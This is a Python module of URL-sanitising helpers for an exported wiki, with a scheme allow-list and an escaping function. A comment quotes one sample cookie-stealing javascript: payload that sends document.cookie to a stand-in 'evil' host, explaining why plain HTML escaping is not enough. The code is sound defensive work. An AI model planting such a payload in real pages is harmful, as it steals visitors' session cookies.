"""URL sanitising shared by every page generator.

Lifted out of wiki_export.py during the split so a mixin module can import it
without importing wiki_export, which imports the mixins - that cycle is the
reason this is its own module.
"""

import html
from typing import Any
from urllib.parse import quote as _urlquote


# Schemes allowed to appear in a generated href. Document source_url values
# come from scraped pages, so they are attacker-influenced content: an entry
# like "javascript:fetch('//evil/'+document.cookie)" contains no HTML
# metacharacters at all, so html.escape() passes it through untouched and it
# becomes a live script-executing link in the exported wiki.
_SAFE_URL_SCHEMES = ('http://', 'https://', 'mailto:')


def safe_external_url(url: Any) -> str:
    """HTML-escape a URL for an href, or return '' if its scheme isn't safe."""
    if not url:
        return ''
    if not str(url).strip().lower().startswith(_SAFE_URL_SCHEMES):
        return ''
    return html.escape(str(url).strip(), quote=True)


def url_query_value(value: Any) -> str:
    """Percent-encode a value for use inside a generated URL query string."""
    return _urlquote(str(value or ''), safe='')
